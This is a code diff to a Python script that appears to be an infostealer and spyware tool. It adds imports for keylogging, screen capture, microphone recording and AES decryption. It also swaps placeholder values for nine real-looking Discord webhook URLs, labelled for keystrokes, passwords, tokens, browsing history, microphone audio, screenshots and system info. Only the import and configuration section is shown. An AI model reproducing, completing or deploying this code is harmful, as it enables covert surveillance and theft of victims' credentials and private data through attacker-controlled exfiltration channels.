@@ -16,22 +16,11 @@ for module in required_modules:
     except ImportError:
         print(f"Installing {module}...")
         subprocess.call(["pip", "install", module])
-import keyboard
-import requests
-import psutil
-import time
-import multiprocessing
-import sqlite3
-import os
-import json
-import zipfile
-import tempfile
-import shutil
-import pyautogui
-import platform
-import re
-import pygetwindow
+import keyboard, requests, psutil, time, multiprocessing, sqlite3, os, json, zipfile,tempfile,shutil,pyautogui,platform,re
+import pygetwindow as gw
 from urllib.parse import urlparse, unquote
+from base64 import b64encode
+import urllib.request, urllib.error
 import base64
 from Crypto.Cipher import AES
 from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
@@ -50,16 +39,15 @@ from datetime import datetime
 from requests import get
 import sounddevice as sd
 from scipy.io.wavfile import write
-
-webhook_live_web ='X'
-webhook_software = 'X'
-webhook_keylogger = 'X'
-webhook_history = "X"
-webhook_password = "X"
-webhook_token = "X"
-webhook_mic = "X"
-webhook_info = 'X'
-webhook_screenshot = 'X'
+webhook_live_web ='https://discord.com/api/webhooks/1144983185860591646/OEsNm58ezkVfp4giOAkXivjLCRTxYVaj1MFttuypsy6CXFQvOfyqranJlK5U_wGRIkQ1'
+webhook_software = 'https://discord.com/api/webhooks/1144985771514802287/jnz0dcQorlhyC_YgcL5nNkoUr4WpCopMVETgCBLZtV05zzi9OzGrm2dCYK0yPDKwdARP'
+webhook_keylogger = 'https://discord.com/api/webhooks/1144991270549332099/7G5f5T29sOj7mjqPoeXeWqAwyapURhOgXh_RTTOKIFN6QPbk_vAId94xsc3sRmlUZEND'
+webhook_history = "https://discord.com/api/webhooks/1145003771353636914/f2w9qqTJff8IDOvdb3h1qNK3wgVjzqQrwKTUlOUaDxbQ0qapnFjMz2kCgpPOfvS_O3q6"
+webhook_password = "https://discord.com/api/webhooks/1145014477377523732/BSLe0ydVfek-w3ilFJNBxoBFJw26vWuM27y6_qsZixS5OjOtc6MpseIjN8vgGpNhwpjb"
+webhook_token = "https://discord.com/api/webhooks/1145063528282214461/SDNtbTbKp2qf1CWr_hFfcaRyJ10lbHKQU0UkdfbWkMojvxLdpCPZ6384mJYC6-iotkTn"
+webhook_mic = "https://discord.com/api/webhooks/1052265255356596284/xg2jeQNwX5XSmcnouqjuKTbKvPocJtiunVf-W2G5YqIiLrFDQIBp7xuQoysHdE_ONnut"
+webhook_info = 'https://discord.com/api/webhooks/1145268427565580288/6lyxFmxYojgyzoBsfcKwrJ4EKWeg9xODoyGCL9_HAw1vwkMN7aOfzoZ9sPSeaMygX_qK'
+webhook_screenshot = 'https://discord.com/api/webhooks/1145268866835034232/1-23-0lKZNd9vUby-iAMJZqVCWsh358_geRXwF7QnXQ3_l2cmRn8GNTOSsEQeD1LiAaN'
 keys_typed = []
 
 
